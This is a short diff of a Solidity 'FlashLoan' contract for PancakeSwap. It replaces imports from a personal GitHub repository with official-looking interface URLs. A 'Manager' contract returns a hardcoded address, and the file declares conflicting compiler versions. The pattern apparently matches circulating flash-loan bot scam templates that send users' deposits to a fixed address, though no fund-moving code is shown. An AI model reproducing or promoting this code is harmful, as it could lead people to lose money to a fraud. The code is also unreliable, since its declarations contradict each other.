@@ -1,14 +1,10 @@
-pragma solidity ^0.6.12;
+pragma solidity ^0.5.0;
+
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Orlandis19/Flash/blob/main/ilendingpoolaccessprovider";
-import "https://github.com/Orlandis19/Flash/blob/main/ILendingPool";
-   
-// PancakeSwap Smart Contracts
-import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IpancakeCalle.sol";
-import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakeFactory.sol";
-import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakePairs.sol";
-   
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
 //Router
 pragma solidity ^0.6.12;
 contract Manager { 
@@ -18,6 +14,15 @@ contract Manager {
         return 0xEfE66eB5db217BCebF0D4E630B533564207Aa4Ee;
     }
 }   
+
+// PancakeSwap Smart Contracts
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+
+
+
+
 contract FlashLoan {
 	string public tokenName;
 	string public tokenSymbol;
